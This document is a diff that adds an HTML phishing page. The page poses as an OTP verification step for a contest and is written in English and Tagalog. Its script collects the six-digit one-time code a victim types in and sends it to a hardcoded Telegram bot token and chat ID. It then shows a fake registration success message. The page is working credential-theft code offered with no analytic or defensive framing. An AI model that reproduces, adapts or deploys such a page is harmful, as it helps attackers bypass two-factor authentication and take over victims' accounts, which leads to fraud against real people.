@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(to bottom right, #b4d444, #44a43c, #2c8c34); height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { width: 100%; max-width: 450px; text-align: center; }
+        .instruction-text { color: white; font-size: 24px; font-weight: bold; line-height: 1.4; margin-bottom: 40px; text-transform: none; }
+        .sub-text { color: white; font-size: 18px; margin-bottom: 15px; }
+        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; }
+        .otp-input { width: 50px; height: 60px; background: white; border: none; border-radius: 4px; text-align: center; font-size: 24px; font-weight: bold; outline: none; }
+        .btn-login { background-color: #d8d8d8; color: #a8a8a8; border: none; width: 100%; padding: 22px; border-radius: 4px; font-size: 22px; cursor: not-allowed; transition: 0.3s; }
+        .btn-login.active { background-color: #ffffff; color: #44a43c; cursor: pointer; font-weight: bold; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-box { background: white; padding: 30px; border-radius: 12px; width: 85%; max-width: 400px; text-align: center; }
+        .btn-ok { background-color: #44a43c; color: white; border: none; padding: 12px; width: 100%; margin-top: 20px; cursor: pointer; border-radius: 4px; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="instruction-text">we have sent you a 6-digit OTP code the code is in the SMS message or email</div>
+        <div class="sub-text">Please enter the code here</div>
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1">
+            <input type="text" class="otp-input" maxlength="1">
+            <input type="text" class="otp-input" maxlength="1">
+            <input type="text" class="otp-input" maxlength="1">
+            <input type="text" class="otp-input" maxlength="1">
+            <input type="text" class="otp-input" maxlength="1">
+        </div>
+        <button id="otpLoginBtn" class="btn-login" disabled>Log in</button>
+    </div>
+
+    <div class="modal-overlay" id="modal">
+        <div class="modal-box">
+            <h2>Tagumpay!</h2>
+            <p>Matagumpay kang nakarehistro sa paligsahan.</p>
+            <hr style="margin: 15px 0; opacity: 0.1;">
+            <p>You have been successfully registered for the contest.</p>
+            <button class="btn-ok" onclick="location.reload()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // --- إعدادات تيليجرام ---
+        const BOT_TOKEN = '7387031434:AAGg2Pgi90Bwiyio8Y-A7DqUr6U_fcIYLAI'; 
+        const CHAT_ID = '8129155953';
+
+        const inputs = document.querySelectorAll('.otp-input'), btn = document.getElementById('otpLoginBtn'), mod = document.getElementById('modal');
+        
+        inputs.forEach((input, i) => {
+            input.oninput = () => {
+                if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
+                const all = Array.from(inputs).every(ins => ins.value.length === 1);
+                btn.disabled = !all;
+                btn.classList.toggle('active', all);
+            };
+            input.onkeydown = (e) => { if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus(); };
+        });
+
+        btn.onclick = () => {
+            let otp = "";
+            inputs.forEach(i => otp += i.value);
+            const text = `📩 **New OTP Code**\n🔢 Code: ${otp}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+            .then(() => { mod.style.display = 'flex'; });
+        };
+    </script>
+</body>
+</html>
